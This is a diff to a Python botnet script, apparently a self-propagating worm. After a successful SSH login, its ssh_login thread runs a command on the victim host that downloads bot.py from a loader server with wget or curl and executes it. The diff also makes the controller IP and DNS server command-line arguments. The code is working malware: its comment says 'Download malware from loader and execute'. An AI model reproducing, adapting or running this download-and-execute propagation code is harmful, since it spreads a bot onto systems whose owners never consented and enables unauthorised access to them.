@@ -16,16 +16,22 @@ from random import randint, choice, shuffle
 from scapy.all import IP, TCP, sr1, RandShort, DNS, DNSQR, UDP
 from uuid import getnode as get_mac
 
-MOD_IP_LIST = ['137.132.153.220', '192.168.0.52', '192.168.0.53', '192.168.0.54', 
-        '192.168.0.55', '192.168.0.56', '192.168.0.57', '192.168.0.58', 
-        '192.168.0.59', '192.168.0.60', '192.168.0.61', '192.168.0.62'
-        ] 
 
+try:
+    MOD_ACTUAL_IP = sys.argv[0]
+    OUR_DNS = sys.argv[1]
+except:
+    exit('MOD_ACTUAL_IP or OUR_DNS value is not supplied.')
+
+
+MOD_IP_LIST = [MOD_ACTUAL_IP, '192.168.1.152', '192.168.1.253', '192.168.1.54', 
+        '192.168.0.55', '192.168.1.56', '192.168.1.57', '192.168.1.158', 
+        '192.168.0.59', '192.168.1.60', '192.168.1.61', '192.168.1.62'
+        ] 
 MOD_IP = None
 
 LOADER_PORT = 8000
 MY_IP = "0.0.0.0"
-OUR_DNS = "192.168.0.51"
 LOCK_FILE = '/tmp/b'
 
 MODULE = 'bot_'+str(get_mac())
@@ -164,7 +170,8 @@ class ssh_login(Thread):
             """
 
             # Download malware from loader and execute.
-            cmd = "cd /tmp/;curl -X GET http://{}:{}/bot.py > bot.py;python3.6 bot.py &".format(MOD_IP, LOADER_PORT)
+            #cmd = "cd /tmp/;curl -X GET http://{}:{}/bot.py > bot.py;python3.6 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
+            cmd = "wget -O bot.py {}:{}/bot.py;python3 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
             s.exec_command(cmd)
             
             print('Login successful using {} {} {}.'.format(self._ip, self._uname, self._pwd))
